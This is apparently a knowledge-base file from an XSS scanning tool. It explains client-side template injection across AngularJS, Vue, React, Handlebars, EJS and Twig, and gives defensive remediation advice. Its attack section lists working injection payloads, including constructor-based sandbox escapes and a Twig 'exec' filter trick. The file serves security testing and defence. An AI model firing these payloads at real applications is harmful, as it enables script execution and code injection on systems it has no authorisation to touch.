#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Modified
Telegram: https://t.me/easyprotech

Knowledge Base: Template Injection (Client-Side)
"""

DETAILS = {
    "title": "Client-Side Template Injection Leading to XSS",
    
    "description": """
Client-Side Template Injection (CSTI) occurs when user input is embedded into client-side templates 
and evaluated as template code rather than text. This allows attackers to break out of the template 
context and execute arbitrary JavaScript. CSTI is particularly dangerous in Single Page Applications 
and can bypass traditional XSS protections.

Affects: Angular/AngularJS, Vue.js, React, Handlebars, Mustache, Pug, EJS, and other template engines.

SEVERITY: CRITICAL
Direct code execution in modern JavaScript frameworks. Increasingly common in SPAs.
""",

    "attack_vector": """
FRAMEWORK-SPECIFIC ATTACKS:

ANGULARJS (1.x):
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{a='alert';b='(1)';a+b}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["alert(1)"].sort(toString.constructor)}}

ANGULAR (2+):
{{constructor.constructor('alert(1)')()}}
Template: <div>{{userInput}}</div> is safe by default
But [innerHTML]="userInput" is dangerous

VUE.JS:
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
<div v-html="userInput"></div> - dangerous

REACT:
<div dangerouslySetInnerHTML={{__html: userInput}} />
JSX injection if not properly escaped

HANDLEBARS:
{{#with this}}{{lookup . 'constructor'}}{{/with}}
{{#each this}}{{@key}}{{/each}}

MUSTACHE:
Similar to Handlebars but more restricted

PUG/JADE:
#{7*7} - for detection
Unescaped: !{userInput}

EJS:
<%= 7*7 %> - escaped
<%- userInput %> - unescaped, dangerous

TWIG:
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("alert(1)")}}
""",

    "remediation": """
DEFENSE:

1. NEVER RENDER USER INPUT AS TEMPLATE CODE
2. Use framework auto-escaping
3. Disable runtime template compilation in production
4. Use precompiled templates
5. Implement CSP
6. Regular security updates
7. Static analysis tools
8. Security testing with framework-specific payloads

ANGULAR:
- Use [innerText] or [textContent]
- Disable template compilation (AOT)
- Use DomSanitizer

VUE:
- Avoid v-html with user input
- Use {{ }} which auto-escapes

REACT:
- Avoid dangerouslySetInnerHTML
- JSX auto-escapes by default

TOOLS:
- ESLint plugins for template security
- Framework-specific security scanners
- Semgrep rules

OWASP REFERENCES:
- CWE-94: Code Injection
- OWASP Template Injection
"""
}
